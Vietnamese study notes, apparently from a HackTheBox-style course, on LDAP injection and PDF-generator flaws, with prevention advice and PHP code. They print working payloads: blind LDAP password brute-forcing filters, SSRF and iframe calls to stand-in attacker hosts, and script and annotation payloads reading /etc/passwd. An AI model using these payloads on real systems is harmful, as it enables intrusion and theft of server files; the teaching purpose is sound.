- Bộ lọc tìm kiếm ban đầu: `(&(uid=admin)(objectClass=account))`
- Khi tiêm wildcard vào `uid`: `(&(uid=*)(objectClass=account))`

Bộ lọc trên sẽ trả về thông tin của tất cả tài khoản trong cơ sở dữ liệu LDAP, thay vì chỉ một tài khoản cụ thể.

**Tiêm Wildcard vào ObjectClass**

- Bộ lọc tìm kiếm ban đầu: `(|(objectClass=organization)(objectClass=device))`
- Sau khi tiêm wildcard vào `objectClass`: `(|(objectClass=organization)(objectClass=*))`

Với bộ lọc này, tất cả các mục trong LDAP sẽ được trả về, giúp kẻ tấn công dễ dàng lấy được dữ liệu từ toàn bộ cơ sở dữ liệu.

#### 2. Blind Exploitation (Tấn Công Blind)

Trong trường hợp ứng dụng không hiển thị kết quả tìm kiếm trực tiếp, có thể thực hiện tấn công "blind" qua LDAP Injection, giống như **blind SQL Injection**, thông qua việc kiểm tra sự khác biệt trong phản hồi.

**Tấn Công Bằng Cách Kiểm Tra Mật Khẩu**

Giả sử bộ lọc xác thực có cấu trúc: `(&(uid=htb-stdnt)(password=p@ssw0rd))`. Kẻ tấn công có thể brute-force từng ký tự mật khẩu bằng cách thử các ký tự khác nhau. Ví dụ:

- Kiểm tra với bộ lọc: `(&(uid=htb-stdnt)(password=a*))` để xem mật khẩu có bắt đầu bằng "a" không.
- Nếu phản hồi không khớp, thử lại với `b*`, tiếp tục đến khi brute-force thành công toàn bộ mật khẩu.

**Exfiltrate Dữ Liệu Từ Các Thuộc Tính Khác**

Ngoài mật khẩu, có thể exfiltrate các thuộc tính khác như `description`:

- Ví dụ, tiêm: `(&(uid=htb-stdnt)(|(description=*)(password=invalid)))`.

Nếu mật khẩu không khớp, điều kiện cho thuộc tính `description` sẽ được kiểm tra, cho phép brute-force từng ký tự trong thuộc tính này.

**Xác Định Các Thuộc Tính Tồn Tại trong Bản Ghi**

Kẻ tấn công có thể xác định các thuộc tính hợp lệ bằng cách tiêm wildcard vào các thuộc tính khác nhau để kiểm tra phản hồi từ ứng dụng:

- **Thuộc tính hợp lệ**: ứng dụng phản hồi tích cực.
- **Thuộc tính không hợp lệ**: ứng dụng phản hồi tiêu cực.

#### Khuyến Cáo

Trong các cuộc tấn công blind LDAP Injection, việc viết script tự động sẽ đẩy nhanh quá trình exfiltration dữ liệu và brute-force các thuộc tính.

### Kết Luận

Blind LDAP Injection cho phép khai thác thông tin từ LDAP ngay cả khi không hiển thị trực tiếp kết quả truy vấn. Các phương pháp khai thác bao gồm sử dụng wildcard hoặc tiêm điều kiện OR để truy xuất dữ liệu, giúp bypass các kiểm tra bảo mật dù kết quả không được hiển thị trực tiếp.

## 6. Phòng Ngừa LDAP Injection

Để bảo vệ ứng dụng khỏi lỗ hổng LDAP Injection, các biện pháp sau đây là thiết yếu:

#### 1. Escape Các Ký Tự Đặc Biệt

Các ký tự đặc biệt cần phải được escape trong LDAP để ngăn chặn việc thay đổi cấu trúc bộ lọc:

- `(` dấu mở ngoặc → `\28`
- `)` dấu đóng ngoặc → `\29`
- `*` dấu sao → `\2a`
- `\` dấu gạch chéo ngược → `\5c`
- `null byte` → `\00`

Việc escape các ký tự này giúp ngăn kẻ tấn công sử dụng chúng để tiêm vào và phá vỡ bộ lọc LDAP.

#### 2. Ví Dụ Cụ Thể trong PHP

Trong PHP, có thể sử dụng hàm `ldap_escape` để tự động escape các ký tự nguy hiểm trước khi đưa dữ liệu vào bộ lọc LDAP.

##### Mã Không Được Bảo Vệ

Dưới đây là ví dụ về mã dễ bị tấn công LDAP Injection:

```php
// Kết nối LDAP
const LDAP_HOST = "localhost";
const LDAP_PORT = 389;
const LDAP_DC = "dc=example,dc=htb";
const LDAP_DN = "cn=ldapuser,dc=example,dc=htb";
const LDAP_PASS = "ldappassword";

// Kết nối tới server
$conn = ldap_connect(LDAP_HOST, LDAP_PORT);
if (!$conn) {
    exit('Kết nối LDAP thất bại');
}

// Thao tác bind
ldap_set_option($conn, LDAP_OPT_PROTOCOL_VERSION, 3);
$bind = ldap_bind($conn, LDAP_DN, LDAP_PASS);
if (!$bind) {
    exit('Thao tác bind LDAP thất bại');
}

// Tìm kiếm
$filter = '(&(cn=' . $_POST['username'] . ')(userPassword=' . $_POST['password'] . '))';
$search = ldap_search($conn, LDAP_DC, $filter);
$entries = ldap_get_entries($conn, $search);
if ($entries['count'] > 0) {
    // Đăng nhập thành công
    <SNIP>
} else {
    // Đăng nhập thất bại
    <SNIP>
}
```

##### Mã Đã Được Bảo Vệ (Sử Dụng `ldap_escape`)

Dưới đây là mã được cải thiện, sử dụng hàm `ldap_escape` để bảo vệ chống lại LDAP Injection:

```php
// Kết nối LDAP
const LDAP_HOST = "localhost";
const LDAP_PORT = 389;
const LDAP_DC = "dc=example,dc=htb";
const LDAP_DN = "cn=ldapuser,dc=example,dc=htb";
const LDAP_PASS = "ldappassword";

// Kết nối tới server
$conn = ldap_connect(LDAP_HOST, LDAP_PORT);
if (!$conn) {
    exit('Kết nối LDAP thất bại');
}

// Thao tác bind
ldap_set_option($conn, LDAP_OPT_PROTOCOL_VERSION, 3);
$bind = ldap_bind($conn, LDAP_DN, LDAP_PASS);
if (!$bind) {
    exit('Thao tác bind LDAP thất bại');
}

// Tìm kiếm (với escape dữ liệu đầu vào)
$filter = '(&(cn=' . ldap_escape($_POST['username']) . ')(userPassword=' . ldap_escape($_POST['password']) . '))';
$search = ldap_search($conn, LDAP_DC, $filter);
$entries = ldap_get_entries($conn, $search);
if ($entries['count'] > 0) {
    // Đăng nhập thành công
    <SNIP>
} else {
    // Đăng nhập thất bại
    <SNIP>
}
```

### Kết Luận

Sử dụng `ldap_escape` trong PHP giúp bảo vệ chống lại LDAP Injection bằng cách đảm bảo dữ liệu người dùng không thể thay đổi cấu trúc truy vấn LDAP. Cùng với các biện pháp escape ký tự đặc biệt, đây là một trong những phương pháp hiệu quả nhất để giảm thiểu nguy cơ bảo mật trong các ứng dụng sử dụng LDAP.

## 7. bảo mật LDAP để tránh lỗ hổng LDAP injection và tăng cường bảo mật cho hệ thống:

### 1. **Giới Hạn Quyền Truy Cập**
   Tài khoản được sử dụng để `bind` tới LDAP server chỉ nên có quyền hạn tối thiểu cần thiết. Điều này đảm bảo rằng nếu có lỗ hổng LDAP injection, kẻ tấn công không thể truy cập vào dữ liệu nhạy cảm hoặc thực hiện các thao tác trái phép trên LDAP server.

   **Lý do**: Giới hạn quyền truy cập sẽ giúp giảm thiểu tác động nếu tài khoản bị xâm nhập, và chỉ cho phép các thao tác cần thiết.

### 2. **Sử Dụng Bind với Thông Tin Người Dùng**
   Thay vì sử dụng LDAP search để xác thực người dùng, bạn có thể sử dụng `bind` với thông tin người dùng (username và password). Phương pháp này giúp giảm thiểu khả năng LDAP injection vì không có truy vấn tìm kiếm có thể bị tấn công. Mỗi người dùng sẽ được xác thực riêng biệt, không sử dụng các truy vấn tìm kiếm chung cho tất cả.

   **Ví dụ mã bảo mật với Bind thông tin người dùng**:

   ```php
   // kết nối LDAP
   const LDAP_HOST = "localhost";
   const LDAP_PORT = 389;
   const LDAP_DC = "dc=example,dc=htb";

   // thông tin người dùng
   $dn = "cn=" . ldap_escape($_POST['username'], "", LDAP_ESCAPE_DN) . ",dc=example,dc=htb";
   $pw = $_POST['password'];

   // kết nối tới server
   $conn = ldap_connect(LDAP_HOST, LDAP_PORT);
   if (!$conn) {
       exit('Kết nối LDAP thất bại');
   }

   // thao tác bind
   ldap_set_option($conn, LDAP_OPT_PROTOCOL_VERSION, 3);
   $bind = ldap_bind($conn, $dn, $pw);
   if ($bind) {
       // đăng nhập thành công
       <SNIP>
   } else {
       // đăng nhập thất bại
       <SNIP>
   }
   ```

   **Giải thích**: Trong ví dụ này, thay vì thực hiện một truy vấn tìm kiếm thông qua thông tin người dùng, chúng ta sử dụng `ldap_bind()` với thông tin người dùng đã được escape để tránh các ký tự đặc biệt có thể bị lạm dụng trong các lỗ hổng injection.

### 3. **Tắt Anonymous Bind**
   Anonymous Bind (kết nối không xác thực) cần được tắt trên LDAP server để đảm bảo rằng chỉ những người dùng đã xác thực mới có thể thực hiện các thao tác với server. Điều này giúp ngăn ngừa các tấn công qua các lỗ hổng LDAP injection khi kẻ tấn công có thể lợi dụng quyền truy cập mà không cần thông tin xác thực.

   **Lý do**: Tắt Anonymous Bind giúp tăng cường bảo mật bằng cách yêu cầu tất cả các kết nối phải được xác thực hợp lệ, giảm thiểu nguy cơ kẻ tấn công có thể lạm dụng hệ thống.

### Kết Luận
Để phòng ngừa LDAP injection, các biện pháp quan trọng bao gồm:

- **Escape đầu vào**: Đảm bảo rằng tất cả các đầu vào từ người dùng đều được escape đúng cách để tránh các ký tự đặc biệt gây ra lỗi truy vấn LDAP.
- **Sử dụng Bind với thông tin người dùng**: Thực hiện bind trực tiếp với thông tin người dùng thay vì sử dụng các truy vấn tìm kiếm có thể bị tấn công.
- **Giới hạn quyền truy cập**: Chỉ cấp quyền tối thiểu cần thiết cho tài khoản bind LDAP, giúp bảo vệ thông tin quan trọng.
- **Tắt Anonymous Bind**: Đảm bảo rằng chỉ người dùng đã xác thực mới có thể truy cập LDAP server.

Áp dụng các thực hành bảo mật này sẽ giúp bảo vệ hệ thống khỏi các lỗ hổng và tấn công LDAP injection.

# Giới Thiệu Về Lỗ Hổng Tạo PDF

Nhiều ứng dụng web cung cấp tính năng tạo PDF cho các báo cáo, hóa đơn, hoặc tài liệu có thông tin động từ người dùng. Mặc dù tính năng này rất hữu ích, nhưng cũng có thể mang lại lỗ hổng bảo mật nếu không được cấu hình và xử lý đầu vào đúng cách. Một trong những lỗ hổng phổ biến liên quan đến PDF generation là **HTML injection**, khi mà các đầu vào không được kiểm tra và làm sạch, tạo cơ hội cho kẻ tấn công tiêm mã độc vào PDF.

### 1. Tạo PDF và Các Lỗ Hổng Liên Quan

**Portable Document Format (PDF)** là một định dạng tệp tài liệu được thiết kế để đảm bảo tính độc lập nền tảng, giúp tài liệu có thể hiển thị đúng trên mọi thiết bị. Với sự phổ biến của PDF, nhiều ứng dụng web tích hợp tính năng tạo PDF, thường sử dụng các thư viện hoặc plugin để tạo tệp PDF từ HTML. Tuy nhiên, các cấu hình sai hoặc thiếu kiểm tra đầu vào có thể dẫn đến những lỗ hổng bảo mật nghiêm trọng.

### 2. Các Thư Viện Tạo PDF Phổ Biến

Ứng dụng web thường sử dụng một trong các thư viện sau để tạo PDF:

- **TCPDF**
- **html2pdf**
- **mPDF**
- **DomPDF**
- **PDFKit**
- **wkhtmltopdf**
- **PD4ML**

Các thư viện này cho phép tạo PDF từ mã HTML, nên chúng sẽ phân tích và hiển thị HTML sau đó chuyển đổi thành tài liệu PDF. Quá trình này có thể mở ra lỗ hổng bảo mật nếu các đầu vào không được làm sạch đúng cách, đặc biệt là khi có mã độc tiêm vào HTML.

### 3. Lỗ Hổng HTML Injection trong PDF Generation

Lỗi phổ biến dẫn đến lỗ hổng bảo mật trong quá trình tạo PDF là khi các đầu vào từ người dùng, chẳng hạn như thông tin đăng ký, tin nhắn hoặc báo cáo, không được kiểm tra hoặc làm sạch. Nếu các dữ liệu này chứa mã HTML hoặc JavaScript độc hại, chúng có thể được thực thi khi PDF được mở, dẫn đến các lỗ hổng như **XSS (Cross-Site Scripting)** hoặc **Script Injection**.

### 4. Ví Dụ: wkhtmltopdf

**wkhtmltopdf** là một công cụ phổ biến để chuyển đổi HTML thành PDF. Mặc dù rất mạnh mẽ và dễ sử dụng, nhưng wkhtmltopdf có một cảnh báo bảo mật nghiêm trọng: nếu sử dụng với HTML không đáng tin cậy, công cụ này có thể dẫn đến việc chiếm quyền hoàn toàn trên máy chủ. Đặc biệt, nếu HTML đầu vào chứa mã độc, kẻ tấn công có thể khai thác nó để thực thi mã bất hợp pháp khi PDF được tạo.

#### Cách Cài Đặt và Sử Dụng wkhtmltopdf:

1. Cài đặt wkhtmltopdf trên hệ thống Linux:

   ```bash
   sudo dpkg -i wkhtmltox_0.12.6.1-2.bullseye_amd64.deb
   ```

2. Sử dụng wkhtmltopdf để tạo PDF từ một URL:

   ```bash
   wkhtmltopdf https://academy.hackthebox.com/ htb.pdf
   ```

3. Hoặc sử dụng một tệp HTML địa phương để tạo PDF:

   ```bash
   wkhtmltopdf ./index.html test.pdf
   ```

### 5. Phân Tích Tệp PDF

Để xác định thư viện tạo PDF mà một ứng dụng web sử dụng, bạn có thể phân tích siêu dữ liệu của tệp PDF. Các thư viện tạo PDF thường thêm thông tin về chính chúng vào các trường `creator` và `producer` trong siêu dữ liệu của PDF. Để thực hiện việc này, bạn có thể sử dụng công cụ **ExifTool** để xem thông tin siêu dữ liệu:

```bash
exiftool <tên_tệp_pdf>
```

### 6. Các Biện Pháp Phòng Ngừa Lỗ Hổng PDF Injection

Việc phòng ngừa lỗ hổng **PDF Injection** đòi hỏi các biện pháp bảo mật toàn diện để bảo vệ ứng dụng web khỏi việc tiêm mã độc vào các tệp PDF tạo ra. Các biện pháp cơ bản bao gồm:

1. **Kiểm Tra và Làm Sạch Đầu Vào:**
   - Trước khi tạo PDF từ HTML, tất cả các đầu vào từ người dùng cần được kiểm tra và làm sạch kỹ lưỡng. Điều này bao gồm việc loại bỏ các ký tự hoặc mã độc hại như JavaScript, hoặc các thẻ HTML không mong muốn.
   - Sử dụng các thư viện **escape** hoặc **validate** để xử lý đầu vào từ người dùng giúp đảm bảo dữ liệu không gây ra lỗ hổng bảo mật. Ví dụ, các thư viện như **htmlspecialchars** trong PHP có thể giúp lọc các ký tự đặc biệt.

2. **Giới Hạn Quyền Truy Cập Vào Thư Viện Tạo PDF:**
   - Đảm bảo rằng chỉ những người dùng hợp lệ và có quyền truy cập hợp lý mới có thể tạo PDF từ hệ thống. Việc kiểm soát quyền truy cập sẽ giúp ngăn chặn người dùng không mong muốn hoặc có mục đích xấu lợi dụng tính năng này để thực hiện các cuộc tấn công.

3. **Cập Nhật và Bảo Trì Các Thư Viện:**
   - Các thư viện cũ thường tiềm ẩn các lỗ hổng bảo mật. Vì vậy, cần phải luôn cập nhật các thư viện tạo PDF lên phiên bản mới nhất để được bảo vệ khỏi các lỗ hổng đã được phát hiện và vá lại. Điều này đặc biệt quan trọng khi sử dụng các công cụ như **wkhtmltopdf**, nơi phiên bản cũ có thể có các vấn đề bảo mật nghiêm trọng.

4. **Sử Dụng Các Biện Pháp Bảo Mật Như Content Security Policy (CSP):**
   - Việc thiết lập **Content Security Policy (CSP)** giúp ngăn chặn các mã JavaScript không đáng tin cậy chạy trong trang web hoặc trong tệp PDF. CSP có thể giúp bảo vệ người dùng khỏi các cuộc tấn công như **Cross-Site Scripting (XSS)** trong khi mở các tệp PDF.

### Kết Luận

Tính năng tạo PDF từ HTML trong các ứng dụng web là rất tiện lợi, nhưng nếu không được triển khai đúng cách, nó có thể mở ra các lỗ hổng bảo mật nghiêm trọng, đặc biệt là **HTML injection**. Để bảo vệ ứng dụng, bạn cần thực hiện các biện pháp kiểm tra và làm sạch đầu vào, sử dụng các thư viện bảo mật, duy trì các công cụ cập nhật, và cẩn trọng với các cấu hình không an toàn.

---

### 7. Ví Dụ Sử Dụng ExifTool

**ExifTool** là công cụ giúp phân tích siêu dữ liệu của các tệp PDF để xác định thư viện tạo PDF và các thông tin bảo mật liên quan. Dưới đây là ví dụ sử dụng **ExifTool**:

1. **Cài đặt ExifTool trên hệ thống:**

   Trên Linux (Debian/Ubuntu):

   ```bash
   apt install libimage-exiftool-perl
   ```

2. **Sử dụng ExifTool để hiển thị thông tin siêu dữ liệu của tệp PDF:**

   ```bash
   exiftool invoice.pdf
   ```

   Kết quả từ ExifTool sẽ cung cấp thông tin về thư viện tạo PDF, ví dụ:

   ```yaml
   Creator                         : wkhtmltopdf 0.12.6.1
   Producer                        : Qt 4.8.7
   ```

   Thông tin này giúp xác định công cụ và phiên bản của thư viện tạo PDF, từ đó giúp nhận diện các lỗ hổng bảo mật tiềm ẩn trong phiên bản cũ.

3. **Sử dụng pdfinfo để hiển thị thông tin siêu dữ liệu:**

   ```bash
   pdfinfo invoice.pdf
   ```

### 8. Các Vấn Đề Bảo Mật Tiềm Ẩn

1. **HTML Injection:**
   - Nếu không kiểm soát đầu vào HTML đúng cách, kẻ tấn công có thể chèn mã độc vào tệp PDF, gây nguy hiểm khi mở tệp trên trình duyệt. Điều này có thể dẫn đến các cuộc tấn công **XSS** (Cross-Site Scripting) hoặc **code injection**.

2. **Cross-Site Scripting (XSS):**
   - Việc không kiểm tra và làm sạch các đoạn mã HTML/JS có thể tạo cơ hội cho kẻ tấn công tiêm mã JavaScript độc hại vào tệp PDF. Khi người dùng mở tệp PDF, mã JavaScript này có thể thực thi, gây ra **XSS**.

3. **Cấu Hình Sai:**
   - Việc sử dụng thư viện cũ hoặc cấu hình không chính xác có thể tạo ra các lỗ hổng nghiêm trọng. Nếu thiếu biện pháp bảo vệ đầu vào hoặc không sử dụng các phiên bản thư viện đã được vá lỗi, ứng dụng web có thể bị tấn công.

### Kết Luận

Để đảm bảo an toàn khi sử dụng tính năng tạo PDF trong các ứng dụng web, bạn cần thực hiện các bước kiểm tra và làm sạch đầu vào HTML/JS từ người dùng, sử dụng các phiên bản thư viện mới nhất, và tắt JavaScript trong các tệp PDF nếu không cần thiết. Bằng cách phân tích các tệp PDF tạo ra từ ứng dụng, bạn có thể xác định loại thư viện và phiên bản đang sử dụng, giúp phát hiện và xử lý các lỗ hổng bảo mật tiềm ẩn.

### 9. Các Lỗ Hổng Thường Gặp Khi Sử Dụng Thư Viện Tạo PDF

Trong quá trình tạo PDF từ HTML, có thể xảy ra nhiều lỗ hổng bảo mật nghiêm trọng nếu không xử lý đầu vào đúng cách. Ba lỗ hổng phổ biến khi sử dụng các thư viện tạo PDF là **tiêm mã JavaScript**, **SSRF** (Server-Side Request Forgery), và **LFI** (Local File Inclusion). Dưới đây là cách khai thác từng lỗ hổng này:

---

###  Thực Thi Mã JavaScript (Server-Side XSS)

Lỗi **tiêm mã JavaScript** xảy ra khi người dùng có thể chèn mã JavaScript vào đầu vào HTML mà không bị kiểm tra hoặc làm sạch đúng cách. Khi thư viện tạo PDF xử lý đầu vào này, mã JavaScript có thể được thực thi trên máy chủ (hoặc client, nếu thư viện hỗ trợ). Đặc biệt, khi thư viện tạo PDF chạy trên máy chủ, mã JavaScript sẽ được thực thi từ phía máy chủ, điều này được gọi là **Server-Side XSS**.

**Khai thác:**
- Nếu ứng dụng cho phép người dùng nhập nội dung HTML (ví dụ: ghi chú, mô tả), có thể chèn mã JavaScript vào đó mà không bị phát hiện.
- Khi PDF được tạo, mã JavaScript này sẽ được thực thi trên máy chủ, có thể dẫn đến việc lộ các thông tin như đường dẫn tệp tin trên máy chủ.

**Ví dụ Payload:**

```html
<script>
  alert("Test1");
</script>
```

Kết quả: 
- Tệp PDF sẽ hiển thị thông báo `"Test1"`, chứng tỏ mã JavaScript đã được thực thi trên máy chủ.

---

###  Lỗ Hổng SSRF (Server-Side Request Forgery)

**SSRF** xảy ra khi một ứng dụng web cho phép người dùng tiêm mã HTML vào đầu vào mà thư viện tạo PDF không kiểm soát đúng cách. Thư viện tạo PDF có thể phải tải các tài nguyên bên ngoài như hình ảnh hoặc tệp CSS. Điều này tạo cơ hội cho kẻ tấn công lợi dụng để thực hiện các yêu cầu HTTP đến các tài nguyên bên ngoài hoặc các ứng dụng web nội bộ.

**Khai thác:**
- Kẻ tấn công có thể chèn các thẻ HTML như `<img>` hoặc `<link>` trỏ đến các URL mà kẻ tấn công kiểm soát. Điều này buộc máy chủ gửi yêu cầu HTTP đến các điểm cuối nội bộ hoặc các máy chủ mà kẻ tấn công muốn.
  
**Ví dụ Payload:**

```html
<img src="http://maliciousdomain.com/ssrftest1" />
```

Kết quả: 
- Khi PDF được tạo ra, máy chủ sẽ gửi một yêu cầu HTTP đến URL `http://maliciousdomain.com/ssrftest1`.
- Nếu hệ thống không được cấu hình đúng cách, kẻ tấn công có thể khai thác SSRF để truy cập các dịch vụ nội bộ hoặc lấy dữ liệu từ các API nội bộ của máy chủ.

---

###  Lỗ Hổng LFI (Local File Inclusion)

**LFI** là lỗ hổng cho phép kẻ tấn công đọc các tệp tin trên hệ thống của máy chủ thông qua các thẻ HTML được tiêm vào đầu vào. Điều này đặc biệt nguy hiểm khi mã JavaScript được thực thi trên máy chủ và có thể sử dụng giao thức `file://` để đọc các tệp tin cục bộ, chẳng hạn như tệp cấu hình hoặc tệp nhạy cảm.

**Khai thác với JavaScript:**

```html
<script>
  var x = new XMLHttpRequest();
  x.onload = function() {
    document.write(this.responseText);
  };
  x.open("GET", "file:///etc/passwd");
  x.send();
</script>
```

Kết quả: 
- Máy chủ sẽ thực hiện yêu cầu đọc tệp `/etc/passwd` trên hệ thống và trả về nội dung của nó.
- Nội dung của tệp `passwd` (chứa thông tin người dùng và mật khẩu) sẽ được hiển thị trong tệp PDF tạo ra.

---

Đây là nội dung bạn đã yêu cầu, không có sự chỉnh sửa hoặc thêm bớt gì:

---

Khai thác mà không cần JavaScript: Nếu máy chủ không thực thi JavaScript, chúng ta có thể thử các thẻ như `<iframe>` hoặc `<object>` để nhúng tệp cục bộ vào PDF. Tuy nhiên, nếu các phương pháp này không hoạt động, chúng ta có thể sử dụng một kỹ thuật khác để giả mạo yêu cầu đến tệp tin cục bộ thông qua máy chủ của chúng ta, bằng cách tạo một tệp redirector.

Ví dụ Payload:

```html
<iframe src="http://attacker.com/redirector.php?url=%2fetc%2fpasswd"></iframe>
```

Khi PDF được tạo, tệp passwd có thể bị rò rỉ nếu thư viện PDF cho phép chèn các tài nguyên từ bên ngoài.

### Annotations và Attachments  
Một tính năng khác của các tệp PDF là annotations và attachments, có thể được sử dụng để rò rỉ tệp tin cục bộ trên máy chủ. Một số thư viện tạo PDF hỗ trợ tính năng này, ví dụ như mPDF và PD4ML. Chúng ta có thể sử dụng các payload như sau để thêm tệp vào dưới dạng đính kèm trong PDF.

Ví dụ Payload (mPDF):

```html
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="LFI" />
```

Khi mở tệp PDF, người dùng có thể nhấp vào annotation và tải về tệp /etc/passwd.

**Kết luận**  
Việc khai thác lỗ hổng trong thư viện tạo PDF có thể gây ra nhiều mối đe dọa nghiêm trọng như XSS, SSRF, LFI và rò rỉ dữ liệu từ các API hoặc tệp tin cục bộ trên máy chủ. Các biện pháp phòng ngừa cần được thực hiện bao gồm việc kiểm tra và kiểm soát chặt chẽ dữ liệu người dùng đầu vào, đồng thời đảm bảo rằng các thư viện tạo PDF không thực thi mã độc hại và không cho phép tải các tệp tin không an toàn.

## 10. Để ngăn ngừa các lỗ hổng trong thư viện tạo PDF, cần thực hiện một số biện pháp bảo mật quan trọng để giảm thiểu nguy cơ bị tấn công. Dưới đây là một số phương pháp và cấu hình cần thiết để đảm bảo an toàn cho hệ thống:

1. **Cấu hình không an toàn**  
Nhiều lỗ hổng bảo mật liên quan đến việc cấu hình không đúng các thư viện tạo PDF. Các cấu hình mặc định của nhiều thư viện có thể không đủ bảo mật, dẫn đến các vấn đề như SSRF, XSS hoặc RCE. Do đó, việc đọc tài liệu hướng dẫn và cấu hình đúng thư viện là rất quan trọng. Ví dụ, thư viện DomPDF có một tùy chọn cấu hình gọi là `enable_remote`, có thể tắt để ngăn chặn các lỗ hổng SSRF.

2. **Vô hiệu hóa thực thi mã JavaScript và PHP**  
Một số thư viện hỗ trợ thực thi mã JavaScript hoặc PHP để tạo PDF động. Tuy nhiên, đây là một lỗ hổng bảo mật nghiêm trọng nếu bị lạm dụng. Cần đảm bảo rằng thư viện không cho phép thực thi mã PHP hoặc JavaScript, ví dụ như việc vô hiệu hóa tùy chọn `isPhpEnabled` trong DomPDF.

3. **Mã hóa HTML Entity**  
Một trong những cách hiệu quả để ngăn chặn việc chèn mã HTML độc hại vào trong dữ liệu người dùng là mã hóa các ký tự HTML bằng cách sử dụng các hàm như `htmlentities` trong PHP. Hàm này sẽ chuyển các ký tự đặc biệt như `<` thành `&lt;`, `>` thành `&gt;`, giúp ngăn chặn việc chèn các thẻ HTML và mã JavaScript không mong muốn.

Đây là nội dung bạn yêu cầu, không có sự chỉnh sửa hoặc thêm bớt gì:

---

4. **Giới hạn quyền truy cập vào tài nguyên bên ngoài và tệp tin cục bộ**  
Tài nguyên bên ngoài: Hạn chế việc truy cập vào tài nguyên bên ngoài (như hình ảnh và bảng mẫu) là cách tốt nhất để tránh SSRF. Nếu tài nguyên bên ngoài phải được sử dụng, một cách tiếp cận an toàn là tạo danh sách trắng các địa chỉ IP hoặc tên miền có thể truy cập.  
Tệp tin cục bộ: Ngăn cấm truy cập vào các tệp tin cục bộ của hệ thống (ví dụ: `/etc/passwd`) là điều cần thiết để ngăn chặn các lỗ hổng Local File Inclusion (LFI).

5. **Lưu trữ tài nguyên cục bộ**  
Để ngăn ngừa các lỗ hổng SSRF, nếu các tài nguyên bên ngoài cần được sử dụng (như hình ảnh, stylesheet), bạn có thể tải chúng xuống và lưu trữ cục bộ trước khi xử lý. Điều này giúp ngăn chặn các yêu cầu HTTP từ máy chủ web đến các tài nguyên bên ngoài, từ đó giảm thiểu khả năng bị tấn công.

6. **Kiểm tra cấu hình thư viện tạo PDF**  
Luôn đảm bảo rằng bạn đã cấu hình đúng các tùy chọn bảo mật trong thư viện PDF bạn đang sử dụng. Đọc kỹ tài liệu hướng dẫn và áp dụng các phương pháp bảo mật của thư viện để giảm thiểu các nguy cơ tiềm ẩn. Các thư viện như mPDF, PD4ML và DomPDF có các tùy chọn cấu hình bảo mật mà bạn cần kiểm tra và vô hiệu hóa các tính năng nguy hiểm như hỗ trợ JavaScript hoặc PHP.

7. **Các biện pháp bảo vệ bổ sung**  
- **Chạy các ứng dụng web trong môi trường hạn chế**: Đảm bảo ứng dụng chạy trong các môi trường có hạn chế quyền truy cập, chẳng hạn như các quyền đọc/ghi vào các thư mục và tệp tin quan trọng trên máy chủ.  
- **Kiểm tra thường xuyên**: Định kỳ kiểm tra các ứng dụng web của bạn bằng các công cụ kiểm tra bảo mật và đảm bảo rằng mọi lỗ hổng bảo mật tiềm ẩn đều được phát hiện và vá lỗi.

8. **Ví dụ thực tế: Kiểm tra bảo mật cho e-Shop**  
Khi thực hiện một cuộc kiểm tra bảo mật đối với một hệ thống thương mại điện tử (e-Shop), bạn có thể thử nghiệm các kỹ thuật khai thác lỗ hổng đã học, bao gồm việc chèn mã HTML độc hại vào các biểu mẫu nhập liệu, kiểm tra khả năng thực thi mã JavaScript trên server, hoặc xác minh các cấu hình của thư viện tạo PDF có dễ bị tấn công không. Cụ thể:
- **Kiểm tra XSS**: Kiểm tra xem ứng dụng có thể thực thi mã JavaScript từ dữ liệu người dùng không.  
- **Kiểm tra SSRF**: Xác minh xem ứng dụng có thể gửi yêu cầu HTTP đến các tài nguyên không đáng tin cậy hoặc các dịch vụ nội bộ không mong muốn không.  
- **Kiểm tra LFI**: Xác nhận rằng ứng dụng không cho phép người dùng truy cập vào các tệp tin quan trọng trên hệ thống.

**Tóm lại**  
Để ngăn ngừa các lỗ hổng bảo mật trong quá trình tạo PDF, bạn cần cấu hình đúng các thư viện tạo PDF, mã hóa các đầu vào của người dùng và kiểm tra kỹ các khả năng cho phép thực thi mã JavaScript hoặc PHP. Việc quản lý tài nguyên và bảo mật quyền truy cập vào các tệp tin nội bộ của máy chủ cũng rất quan trọng trong việc bảo vệ ứng dụng khỏi các tấn công tiềm ẩn.

---









